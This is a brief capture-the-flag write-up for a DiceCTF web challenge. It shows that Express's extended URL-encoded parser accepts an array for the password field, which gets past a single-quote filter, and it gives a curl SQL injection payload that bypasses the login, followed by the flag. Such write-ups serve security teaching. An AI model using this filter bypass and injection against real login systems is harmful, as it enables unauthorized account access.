**Challenge**: https://missing-flavortext.dicec.tf/

**Source code**: https://dicegang.storage.googleapis.com/uploads/93b69e65a6c5be22a9910caaacd36da72733f475031f96e0082d3c6bf76e77de/index.js

It is possible to send an array instead of a string. So, we can bypass the filter.

Vulnerable code: `app.use(bodyParser.urlencoded({ extended: true }));`.

Filter: `if ([req.body.username, req.body.password].some(v => v.includes('\'')))`.

Payload:
```shell
curl -X POST "https://missing-flavortext.dicec.tf/login" -d "username=123&password[]=1'or '1'=='1"
```

**Flag**: dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}
